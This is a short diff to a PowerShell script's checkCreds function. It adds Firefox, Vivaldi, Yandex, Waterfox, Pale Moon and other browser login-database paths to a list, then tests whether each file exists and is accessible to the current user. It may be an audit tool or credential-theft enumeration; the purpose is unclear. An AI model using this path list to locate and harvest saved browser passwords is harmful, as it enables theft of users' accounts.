@@ -1818,8 +1818,15 @@ function checkCreds {
         "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data",
         "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
         "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
-        "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Login Data"
+        "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Login Data",
+        "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json",
+        "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INet Login",
+        "$env:USERPROFILE\AppData\Local\Vivaldi\User Data\Default\Login Data",
+        "$env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data",
+        "$env:APPDATA\Waterfox\Profiles\*.default\logins.json",
+        "$env:APPDATA\Pale Moon\Profiles\*.default\logins.json"
     )
+    
     foreach ($dbPath in $databases) {
         try {
             if ((Test-Path $dbPath) -and ((Get-Acl $dbPath).Access.IdentityReference -match "$env:USERDOMAIN\\$env:USERNAME")) {
